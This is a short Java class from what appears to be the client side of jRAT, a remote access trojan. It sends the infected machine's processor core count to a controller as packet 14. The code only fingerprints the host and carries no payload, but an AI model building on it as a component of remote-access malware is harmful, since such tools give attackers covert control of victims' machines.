package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet14InitAvailableCores extends AbstractOutgoingPacket {

	@Override
	public void write(Connection dos) throws Exception {
		short cores = (short) Runtime.getRuntime().availableProcessors();
		
		dos.writeShort(cores);
	}

	@Override
	public short getPacketId() {
		return (byte) 14;
	}
}
